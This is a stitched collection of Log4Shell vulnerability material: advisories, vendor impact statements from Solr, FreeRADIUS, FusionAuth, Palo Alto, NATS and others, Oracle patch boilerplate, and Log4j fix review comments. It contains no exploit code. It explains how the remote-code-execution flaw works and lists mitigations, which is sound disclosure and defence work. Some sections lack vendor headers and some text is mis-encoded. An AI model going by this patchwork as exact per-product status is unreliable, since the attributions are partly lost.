* CVE-2021-44228 tracks the initial JNDI injection and RCE vulnerability in Log4j 2. This vulnerability poses considerabily more risk than the others.
* CVE-2021-4104 tracks a very similar vulnerability that affects Log4j 1 if JMSAppender and malicious connections have been configured.
* CVE-2021-45046 tracks an incomplete fix for CVE-2021-44228 affecting Log4j 2.15.0 when an attacker has "...control over Thread Context Map (MDC) input data when the logging configuration uses a non-default Pattern Layout with either a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Map pattern."

We provide [tools](https://github.com/CERTCC/CVE-2021-44228_scanner) to scan for vulnerable jar files.

More information is available from the [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html) page, including these highlights.

Certain conditions must be met to make Log4j 1.x vulnerable:

> Log4j 1.x mitigation: Log4j 1.x does not have Lookups so the risk is lower. Applications using Log4j 1.x are only vulnerable to this attack when they use JNDI in their configuration. A separate CVE (CVE-2021-4104) has been filed for this vulnerability. To mitigate: audit your logging configuration to ensure it has no JMSAppender configured. Log4j 1.x configurations without JMSAppender are not impacted by this vulnerability.

Log4j API code alone is not affected:

> Note that only the log4j-core JAR file is impacted by this vulnerability. Applications using only the log4j-api JAR file without the log4j-core JAR file are not impacted by this vulnerability.

### Impact

A remote, unauthenticated attacker with the ability to log specially crafted messages can cause Log4j to connect to a service controlled by the attacker to download and execute arbitrary code.

### Solution

In Log4j [2.12.2](https://lists.apache.org/thread/fvl15g8lkqf9d8owqhg9z9p2hthvchws) (for Java 7) and [2.16.0](https://lists.apache.org/thread/t72msv9cpxw9q5zw8rfkhx52v24z57f1) (for Java 8 or later) the message lookups feature has been completely removed. In addition, JNDI is disabled by default and other default configuration settings are modified to mitigate CVE-2021-44228 and CVE-2021-45046.

For Log4j 1, remove the JMSAppender class or do not configure it. Log4j 1 is [not supported](https://logging.apache.org/log4j/1.2/) and likely contains unfixed bugs and vulnerabilities (such as CVE-2019-17571).

For applications, services, and systems that use Log4j, consult the appropriate vendor or provider. See the CISA [Log4j Software List](https://github.com/cisagov/log4j-affected-db#software-list) and the [Vendor Information](#vendor-information) section below.

### Workarounds

Remove the JndiLookup class from the classpath, for example:

`zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`

As analysis has progressed, certain mitigations have been found to be less effective or incomplete. See "Older (discredited) mitigation measures" on the [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html) page.

[SLF4J](http://slf4j.org/log4shell.html) also recommends write-protecting Log4j configuration files.

### [Apache Solr](#Apache%20Solr) Affected

| --- | --- |
| **CVE-2021-44228** | Affected |
| **CVE-2021-45046** | Not Affected |

#### Vendor Statement

**Apache Solr** releases prior to 8.11.1 were using a bundled version of the Apache Log4J library vulnerable to RCE (see **CVE-2021-44228**). Malicious input from a user-supplied query string (or any other URL request parameter like request handler name) is logged by default with log4j.

Apache Solr releases prior to 7.4 (i.e. Solr 5, Solr 6, and Solr 7 through 7.3) use Log4J 1.2.17 which may be vulnerable for installations using non-default logging configurations that include the JMS Appender (see **CVE-2021-4104**).

In response to the vulnerabilities, the Apache Solr team released version **Solr 8.11.1** that bundles **log4j 2.16.0**. An update to 2.17.0 (or later) will be done with the next maintenance release as Solr is not vulnerable to CVE-2021-45105 (see below).

Apache Solr releases are not vulnerable to the followup **CVE-2021-45046** and **CVE-2021-45105**, because the MDC patterns used by Solr are for the collection, shard, replica, core and node names, and a potential trace id, which are all sanitized and injected into log files with "%X". Passing system property **log4j2.formatMsgNoLookups=true** is suitable to mitigate.

**Solr's Prometheus Exporter** uses Log4J as well but it does not log user input or data, so we don't see a risk there.

| --- | --- |
| **Vendor Statement:** | |
| weâre theoretically vulnerable to it, but an attacker would have to have write access to the file system to change the log4j configuration to enable the JMSAppender and to tweak the topic as described. Given that, I donât think itâs particularly relevant. I imagine this CVE would be more dangerous to someone that hosts someone elseâs Java code where they allow them to customize the log4j configuration running with their app. We are looking at moving to logback. | |

| **CVE-2021-44228** | Not Affected |
| **CVE-2021-45046** | Not Affected |

#### Vendor Statement

The FreeBSD Project does not ship Java or Apache log4j as part of the base operating system. While there are third-party packages available via the ports and pkg system that may be affected, the FreeBSD Project defers to each upstream project on their vulnerability status. Please see the referenced tracking bug that lists known affected ports and pkgs.

### [FreeRADIUS](#FreeRADIUS) Not Affected

Notified:  2021-12-13

**Statement Date:   December 15, 2021**

| **CVE-2021-4104** | Not Affected |
| --- | --- |
| **CVE-2021-44228** | Not Affected |
| **CVE-2021-45046** | Not Affected |

#### Vendor Statement

FreeRADIUS is not affected by this vulnerability.

However, the RADIUS protocol allows for unknown users to attempt authentication. The user is in complete control over the RADIUS User-Name. The RADIUS server can produce logs containing the User-Name filed controlled by the attacker. Depending on the local site configuration, the logs may be consumed by something which eventually reaches a vulnerable log4j instance.

There is a good summary written by Radiator software https://blog.radiatorsoftware.com/2021/12/radius-servers-and-log4j-vulnerability.html

We agree with their analysis, and with their conclusions.

# Log4j CVE: How it affects FusionAuth (TLDR: It doesn't)

FusionAuth does not use Log4j and is not affected by CVE-2021-44228

  ![](/img/blogs/fusionauth-log4j-cve/log4j-cve-how-it-affects-fusionauth-tldr-it-doesnt-header-image.png)        [![](/img/blogs/social/twitter.svg)](https://twitter.com/intent/tweet?via=fusionauth&url=https://fusionauth.io/blog/log4j-fusionauth.html) [![](/img/blogs/social/linkedin.svg)](https://www.linkedin.com/sharing/share-offsite/?url=https://fusionauth.io/blog/log4j-fusionauth.html) [![](/img/blogs/social/reddit.svg)](https://www.reddit.com/submit) [![](/img/blogs/social/hacker-news.svg)](https://news.ycombinator.com/submit)

Published: December 10, 2021

The recent announcement of [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228), which allows for âarbitrary code loaded from LDAP servers when message lookup substitution is enabledâ through a vulnerability in log4J has many people double checking the dependencies of their Java applications. This CVE is also known as the âLog4Shellâ vulnerability.

FusionAuth is not affected by this vulnerability in Log4j. FusionAuth uses a different logging framework, [Logback](http://logback.qos.ch/), so there is no way that any FusionAuth applications could be compromised.

       note

FusionAuth is not affected by this vulnerability.

Log4j is a popular logging framework and is used in many Java projects, both open source and commercial. When a CVE like this comes out, it makes sense to check all of your applications for the issue. Security is important to us and we understand why customers and users would reach out about this.

In conclusion, FusionAuth is *not affected by the Log4j vulnerability*.

To learn more about the CVE, you can:

* visit the [NIST CVE description](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
* review a [detailed report about the vulnerability](https://www.lunasec.io/docs/blog/log4j-zero-day/)
* participate in the [HackerNews discussion](https://news.ycombinator.com/item?id=29504755)
* read [a message from the Logback maintainers about this issue](http://mailman.qos.ch/pipermail/announce/2021/000163.html)

**Update December 15:** There is an additional related CVE: [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046). This also does not affect FusionAuth because FusionAuth does not use log4j.

## What about Elasticsearch

Elasticsearch is used by many FusionAuth installations. However, in general the Elasticsearch service is not publicly accessible, if [following the recommended security guidance](/docs/operate/secure-and-monitor/securing).

       note

You should never allow internet connections to Elasticsearch.

Per the [Elasticsearch announcement](https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476):

> Elasticsearch is not susceptible to remote code execution with this vulnerability due to our use of the Java Security Manager. Elasticsearch on JDK8 or below is susceptible to an information leak via DNS which is fixed by a simple JVM property change.

There is no vulnerability if you are running in FusionAuth Cloud. Deployments there do not allow external access to the Elasticsearch servers. FusionAuth versions between 1.16 and 1.31 are running Java 14. FusionAuth versions 1.32 or greater are running Java 17. If you need specific version information, please [open a support ticket](https://account.fusionauth.io/account/support/).

If you are self-hosting FusionAuth, please review the Elasticsearch guidance and your Elasticsearch and Java configurations to ensure you arenât vulnerable.

**Update December 15:** There is an additional related CVE: [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046). Per the [Elasticsearch announcement](https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476):

> A further vulnerability (CVE-2021-45046) was disclosed on December 14th after it was found that the fix to address CVE-2021-44228 in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. Our guidance for Elasticsearch and Logstash are unchanged by this new vulnerability and we are currently working to assess other products in order to provide a clear statement.

## A bit more about security and FusionAuth

Beyond this specific vulnerability, we want to assure readers that FusionAuth takes security very seriously.

This commitment includes, but is not limited to:

* a [responsible disclosure program](/security)
* regular penetration tests
* security disclosures in our extensive [release notes](/docs/release-notes/)

## Oracle Critical Patch Update Advisory - July 2022

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 349 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [July 2022 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2880220.1).

**Please note that since the release of the April 2022 Critical Patch Update, Oracle has released a Security Alert for Oracle E-Business Suite [CVE-2022-21500 (May 19, 2022)](https://www.oracle.com/security-alerts/alert-cve-2022-21500.html). Customers are strongly advised to apply the July 2022 Critical Patch Update for Oracle E-Business Suite, which includes patches for this Alert as well as additional patches.**

#### Note:

* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/rs?type=doc&id=2160904.1) for information on minimum revisions of security patches required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Solaris Third Party Bulletins are used to announce security patches for third party software distributed with Oracle Solaris. Solaris 10 customers should refer to the latest patch-sets which contain critical security patches detailed in Systems Patch Availability Document. Please see Reference Index of CVE IDs and Solaris Patches ([My Oracle Support Note 1448883.1](https://support.oracle.com/rs?type=doc&id=1448883.1)) for more information.
* Users running Java SE with a browser can download the latest release from <https://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpujul2022verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

### Description

Apache Log4j Java library is vulnerable to a remote code execution vulnerability CVE-2021-44228, known as Log4Shell, and related vulnerabilities CVE-2021-45046, CVE-2021-45105, and CVE-2021-44832. Log4Shell allows remote unauthenticated attackers with the ability to inject text into log messages to execute arbitrary code loaded from malicious servers with the privileges of the process utilizing Log4j.

These products and services are not affected by Log4Shell: Bridgecrew, Cortex Data Lake, Cortex XDR agents, Cortex XSOAR, Cortex Xpanse, Enterprise Data Loss Prevention (DLP), Expedition, the GlobalProtect app, IoT Security, Okyo Garde, PAN-DB Private Cloud, PAN-OS software running on firewalls including VM and CN series, Prisma Access, Prisma Cloud, Prisma Cloud Compute, Prisma SD-WAN (CloudGenix), SaaS Security, Traps, User-ID Agent, WildFire Appliance (WF-500), and WildFire Cloud.

We have determined that some configurations of Panorama appliances with PAN-OS 9.0, PAN-OS 9.1, and PAN-OS 10.0 are impacted by CVE-2021-44228 and CVE-2021-45046 through the use of Elasticsearch. Fixes were released on December 20, 2021 to address both vulnerabilities on impacted PAN-OS versions. Panorama appliances are not impacted by CVE-2021-45105 and CVE-2021-44832.

NOTE: PAN-OS 8.1 and PAN-OS 10.1 versions for Panorama are not impacted by these issues. All versions of PAN-OS for firewalls and WildFire appliances are not affected.

These vulnerabilities impact Exact Data Matching (EDM) CLI application versions 1.0 - 2.0 provided by Enterprise Data Loss Prevention (DLP). Enterprise DLP is not affected by these issues.

The Palo Alto Networks Product Security Assurance team has completed evaluation of all products and services for these vulnerabilities. All cloud services with known possible impact have been remediated.

At this time, our guidance and criteria for impacted Panorama appliances remain the same for all related vulnerabilities. The Exact Data Matching (EDM) CLI application should now be upgraded to EDM CLI version 2.1 or later versions.

### Required Configuration for Exposure

Vulnerabilities CVE-2021-44228 and CVE-2021-45046 are applicable to Panorama hardware appliances and virtual appliances that have Elasticsearch software running. Appliances that are run in Panorama mode or Log Collector mode, and have also been part of a Collector Group, are impacted. You can determine if the appliance is part of a Collector Group by visiting 'Panorama > Managed Collectors' from the web interface and verify that Elasticsearch is running on the appliance by checking the command ‘show system software status | match elasticsearch’ from the CLI.

Appliances running in Management Only mode or Legacy mode, including those used for Prisma Access, are not impacted.

### Severity: CRITICAL

CVSSv3.1
Base Score:
9.8 ([CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/4.0#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H))

### Exploitation Status

Palo Alto Networks is not aware of evidence showing the exploitation of these vulnerabilities against Panorama hardware appliances, Panorama virtual appliances, or the Exact Data Matching CLI application.

More information about the vulnerability's exploitation in the wild can be found in the Unit 42 threat brief: <https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/>

### Weakness Type

[CWE-94 Improper Control of Generation of Code ('Code Injection')](https://cwe.mitre.org/data/definitions/94 "More at https://cwe.mitre.org/data/definitions/94")

### Solution

These issues are fixed in PAN-OS 9.0.15, PAN-OS 9.1.12-h3, PAN-OS 10.0.8-h8, and all later PAN-OS versions for Panorama hardware and virtual appliances.

NOTE: Though PAN-OS 10.1 is not impacted by the these vulnerabilities, the responsible Log4j code was removed for additional assurance from PAN-OS 10.1 versions for Panorama appliances starting with PAN-OS 10.1.4.

If Panorama is running an impacted version of PAN-OS, and you would prefer to upgrade to PAN-OS 10.1, upgrade all appliances in affected Collector Groups to the latest PAN-OS 10.1 Preferred release (PAN-OS 10.1.3-h1 at time of publication) to remediate these issues.

NOTE: Prisma Access customers should refer to the Prisma Access and Panorama version compatibility document before upgrading Panorama: <https://docs.paloaltonetworks.com/compatibility-matrix/prisma-access/prisma-access-and-panorama-version-compatibility.html>

NOTE: Downgrading to PAN-OS 10.0 or earlier PAN-OS versions is not currently supported once Panorama is upgraded to PAN-OS 10.1.

Workarounds are available that eliminate the exposure for these older versions of Panorama until they can be upgraded to a fixed version.

For Enterprise Data Loss Prevention customers, these issues are fixed in Exact Data Matching (EDM) CLI application version 2.1 and all later EDM CLI versions.

No updates for other Palo Alto Networks products are required at this time.

Cortex XSOAR customers that have opted to deploy Elasticsearch in their environment should refer to the Elasticsearch announcement (ESA-2021-31) for remediation information. Elasticsearch 7.16 is not supported with Cortex XSOAR:

<https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476>

Enable signatures for unique threat IDs 91991, 91994, 91995, 92001, and 92007 to block a number of known attacks against CVE-2021-44228 and CVE-2021-45046 across the network.

These signatures block the first stage of the attack. Suitable egress filtering is key to blocking the second stage of the attack. Use App-ID for ‘ldap’ and ‘rmi-iiop’ to block all LDAP and RMI to or from untrusted networks and unexpected sources.

SSL decryption needs to be enabled on the firewall to block known attacks over HTTPS.

Customers with log4j in their environments should upgrade or apply workarounds suggested by respective vendors, and not rely only on the Threat Prevention signatures.

See <https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/> for more details on the Palo Alto Networks product capabilities to protect against attacks that exploit this issue.

### Workarounds and Mitigations

For each Panorama hardware appliance and virtual appliance running in Panorama mode or Log Collector mode, that has also been part of a Collector Group, must be removed from their Collector Group in ‘Panorama > Collector Group > Custom-CG-Name > General' from the web interface. Once affected appliances are removed from all groups, a Panorama commit and Collector Group push for all affected Collector Groups must be performed. The Collector Groups should not be deleted before performing the Collector Group push for the affected Collector Groups, else the Collector Group push will fail to remove the appliances.

NOTE: When this workaround is applied, logging and reporting features in Panorama will not work. All logs stored on the appliance will be lost once it is removed from the Collector Group.

Finally, all appliances that were part of the Collector Group need to be restarted to stop the use of Elasticsearch. This eliminates the exposure to CVE-2021-44228 and CVE-2021-45046.

You can restart the appliance by visiting ‘Panorama > Operations > Device Operations > Reboot Panorama’ from the web interface or by using the command ‘request restart system’ from the CLI.

Once these steps are completed, you can verify that Elasticsearch has stopped and the appliance’s exposure to CVE-2021-44228 and CVE-2021-45046 has been removed, by running the command ‘show system software status | match elasticsearch’ from the CLI.

Managed PAN-OS firewalls can be configured to forward logs to other servers until Panorama log collection functionality is restored. Alternate Log Forwarding options are detailed here: <https://docs.paloaltonetworks.com/pan-os/10-0/pan-os-web-interface-help/objects/objects-log-forwarding.html>

Follow the security best practices listed in ‘Protecting Panorama and Log Collector Inbound and Outbound Communications’ to reduce the risk of successful exploitation of CVE-2021-44228 and CVE-2021-45046 on Panorama appliances: <https://live.paloaltonetworks.com/t5/general-articles/protecting-panorama-and-log-collector-inbound-and-outbound/ta-p/454071>

Additionally, use ACLs to limit network access to Panorama to only trusted users and trusted networks and IP addresses. Use App-ID for ‘ldap’ and ‘rmi-iiop’ to block all LDAP and RMI traffic to and from untrusted networks or unexpected sources.

No other workarounds or mitigations are available for Palo Alto Networks products at this time.

### Frequently Asked Questions

#### Q. Does Panorama use Log4j?

> Panorama includes Elasticsearch, which uses the Log4j library.
>
> Panorama devices and virtual appliances running on PAN-OS 9.0, PAN-OS 9.1, and PAN-OS 10.0 software include Elasticsearch 5.6.7 which uses Log4j 2.9.1. Only the Panorama versions listed as affected in this advisory are susceptible to RCE risks associated with Log4Shell vulnerabilities. Though the fixed versions of Panorama list the same versions of Log4J, the vulnerable Java class file has been removed from them.
>
> Panorama with PAN-OS 8.1 includes Elasticsearch 2.2.2 with Log4j 1.2.17 and Panorama with PAN-OS 10.1 includes Elasticsearch 6.8.12 with Log4j 2.11.1. These do not have the security risks associated with Log4Shell.

#### Q. How was Log4j fixed in Panorama?

> In fixed versions of PAN-OS for Panorama, the included Elasticsearch package was remediated through the deletion of the vulnerable Log4j JndiLookup class file. This solution is provided by Elasticsearch announcement (ESA-2021-31) and the Log4j Security Vulnerabilities Page as a complete remediation option for CVE-2021-44228 and CVE-2021-45046. Panorama appliances are not impacted by CVE-2021-45105 and CVE-2021-44832, requiring no specific fix.
>
> NOTE: Though PAN-OS 10.1 is not impacted by these vulnerabilities, the JndiLookup.class was removed out of an abundance of caution in PAN-OS for Panorama appliances starting with PAN-OS 10.1.4.

Perhaps IPv6 as well `[::1]`? (brackets may or may not be necessary depending how we extract the host)

Great job [@rgoers](https://github.com/rgoers)! Thanks so much for such a prompt action!

I guess you're gonna incorporate the suggested *allowed schemes* configuration knob too.

I am also inclined to add a property (`log4j2.jndiLookupEnabled`?) for toggling JNDI lookups and disable it by default. What do you think?

Sorry, something went wrong.

The rest of the classes are `final`, though `Number` isn't. I would keep `Number` out of this list.

This comment is on the first commit. The second commit added filtering by protocol.

I haven't added a complete kill switch and wasn't planning to. Rather than doing that I think it would be better to figure out a generic way to "hide" plugins.

More importantly, the class is abstract so can never appear here. I am not inspecting sub-classes, only the actual class being instantiated. I will remove Number.

Sorry, something went wrong.

I could go either way on casing here since the included values aren't constant (e.g. NetUtils.getLocalIps() is dynamic).

I agree with [@carterkozak](https://github.com/carterkozak) that lower-case feels more appropriate since these are not immutable lists.

I tested that before I wrote any code. Once the code was added it isn't possible for it to happen any more as we no longer support Referenceable objects and there is no way to re-enable them. They are simply too dangerous.

Are we confident the attributes resolved here are equivalent to the results of `context.lookup`? I imagine the attributes could change over time.

I assume you mean the attributes associated with the returned item. All the attributes returned from LDAP for Java objects are specified in <https://datatracker.ietf.org/doc/html/rfc2713>.

I want to make sure that `context.getAttributes(name)` verifies against the same data (cached without any sort of refresh or network call) as the subsequent call to `context.lookup(name)`, otherwise the verification isn't very helpful.

Well, yeah. That is how DirContext is documented to work. <https://docs.oracle.com/javase/8/docs/api/javax/naming/directory/DirContext.html#getAttributes-java.lang.String->

| Is it a security vulnerability?  I think it is.  It is very surprising that this critical security issue does not seem to have received due attention. It was reported to Apache half a month ago, but it was not fixed until five days ago. Even today, it has not released a new stable version to solve it. |

Is there anyone dealing with this matter urgently? It's really incomprehensible that I didn't see Apache give any emergency warning under such a serious problem. |

This could affect hundreds of thousands, if not millions, of services actively running on the internet.  We of course appreciate the efforts from contributors, but overall this is a major security issue that needs a new version release and a security advisory. |

This could affect hundreds of thousands, if not millions, of services actively running on the internet.  We of course appreciate the efforts from contributors, but overall this is a major security issue that needs a new version release and a security advisory.  My understanding is that the procedure is to hold off on announcing the vulnerability until a patch is available. (See <https://www.apache.org/security/>).  For background:  The team is taking it seriously. As Gary said, we are all volunteers working on this in our spare time. We are also in different time zones so communication is not instantaneous. If you think things can be improved, that's great! We need more people like you and I would encourage you to [get involved](https://community.apache.org/)!  We are in the process of getting a release out with the fix. During review, some security experts found a new vulnerability in our fix (a way to bypass the fix). This has been addressed and we are now in the process of reviewing the updated 2nd release candidate.  Usually (as per ASF rules) the team [should wait 72 hours](https://www.apache.org/legal/release-policy.html#release-approval) after creating a release candidate before publishing the release to give the community enough time to review and cast their votes. We are building consensus to shorten that window for this particular release, given its urgency. |

| You can't ask everybody to upgrade to 2.15 at once. And the `formatMsgNoLookups` option is available to log4j ≥ 2.10 only.  Thanks to [LOG4J2-703](https://github.com/apache/logging-log4j2/commit/3203d3eab6bdd12fdad7ded1860db16a89468c3f), I think it's quite safe to remove `org/apache/logging/log4j/core/lookup/JndiLookup.class` from `log4j-core-*.jar` as a workaround. Just `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class` to disable `${jndi:...}` functionality completely.  I posted all log4j-core jar with `JndiLookup.class` removed at <https://github.com/zhangyoufu/log4j2-without-jndi> for reference. Simple local test looks promising. |

| Update: the vote for log4j-2.15.0 passed and the release is in progress.  I can see the log4j web site reflecting the [log4j 2.15.0 release](https://logging.apache.org/log4j/2.x/changes-report.html#a2.15.0), but I cannot see the 2.15.0 [artifacts on Maven Central](https://search.maven.org/search?q=g:org.apache.logging.log4j) yet at this moment. It may take a few hours before mirror servers are synchronized and the artifacts become available for you.  An announcement email for the release will be sent out soon (within 24 hours - we usually wait some time for the mirror servers to catch up).  Thank you [@zhangyoufu](https://github.com/zhangyoufu) for the suggested workaround for older versions of log4j to remove the `JndiLookup.class` class! The team likes your idea and we will include the workaround you suggested in the release notes and announcement email. Many thanks! |

| Hi [@rgoers](https://github.com/rgoers), is log4j 1.x vulnerable?  Hi [@yuezk](https://github.com/yuezk), as far as I can tell, log4j 1.x does not support lookups. ~~I also could not find any other reference to JNDI in the [log4j 1.x source code](http://svn.apache.org/viewvc/logging/log4j/trunk/). So, no guarantees but it looks like 1.x is not impacted by this vulnerability.~~ ***CORRECTION***: **log4j 1.x contains a JMS Appender which can use JNDI. So I would say that, yes, log4j 1.x is also impacted by this vulnerability** (Thank you [@garydgregory](https://github.com/garydgregory) for pointing this out).  **Update (2021-12-11 09:09 JST): according to [this analysis](https://twitter.com/ceki/status/1469449618316533762) by [@ceki](https://github.com/ceki) (the author of log4j 1.x), Log4j 1.x is not impacted, since it does not have lookups, and the JMS Appender only loads Strings from the remote server, not serialized objects.**  **Update (2021-12-12 10:09 JST): according to [this analysis](https://github.com/apache/logging-log4j2/pull/608#issuecomment-991723301) by [@TopStreamsNet](https://github.com/TopStreamsNet), strictly speaking, applications using Log4j 1.x may be impacted if their configuration uses JNDI. However, the risk is much lower.**  Note that log4j 1.x is [End of Life](https://logging.apache.org/log4j/1.2/) and has [other security vulnerabilities](https://www.cvedetails.com/cve/CVE-2019-17571/) that will not be fixed. ~~So we do not recommend using log4j 1.x as a way to avoid this security vulnerability.~~ The recommendation is to upgrade to 2.15.0. |

# Apache Log4j 2 Java library

*2021-12-13*

Regarding `CVE-2021-44228`, aka “Log4Shell”, aka “LogJam”, a
security-impacting bug of text re-interpolation over untrusted data in the
Log4j v2 library:

* The NATS service is written in Go
* NATS client libraries are written in a variety of languages, but the core ecosystem is written in Go
* The direct client library for Java,
  [nats.java](https://github.com/nats-io/nats.java),
  does not use or reference log4j; but like any code which logs in Java, the
  developer using the library can use injection to setup log4j as the logging
  framework.
  + By the very design of code injection as a development pattern, this is
    outside of the control of the NATS Maintainers and all we can do is
    acknowledge that “someone might have done that”.
* One repository, the
  [nats-jms-bridge](https://github.com/nats-io/nats-jms-bridge),
  contains an admin console which transitively depends upon log4j; this admin
  console is for privileged access.
  + The admin console is not built by default with any particular version of
    log4j, but the integration test script would set up a classpath which
    contained a vulnerable version. This has been
    [fixed in PR/290](https://github.com/nats-io/nats-jms-bridge/pull/290).
* The NATS components will log data in various error scenarios, or when debug
  or trace level logging is enabled; the escaping used is to protect against
  string rendering attacks such as newlines leading to log-line injection, and
  would not sanitize most exploit strings for CVE-2021-44228.
  As such, the NATS server, like most service software not written in Java,
  can be a pass-through vector for log-strings containing a malicious payload:
  the expected contract of logging systems is that this should be safe.
  + Anyone using log-processing software written in a language targeting the
    JVM should be examining that software for exposure.
  + The NATS maintainers consider this to be outside of our scope of
    responsibility. We will continue to log as appropriate, redacting secrets
    and protecting line-based logs against newline injections, but not
    otherwise filtering.

## Oracle Critical Patch Update Advisory - April 2022

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 520 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [April 2022 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2857016.1).

* Solaris Third Party Bulletins are used to announce security patches for third party software distributed with Oracle Solaris. Solaris 10 customers should refer to the latest patch-sets which contain critical security patches detailed in Systems Patch Availability Document. Please see Reference Index of CVE IDs and Solaris Patches ([My Oracle Support Note 1448883.1](https://support.oracle.com/rs?type=doc&id=1448883.1)) for more information.
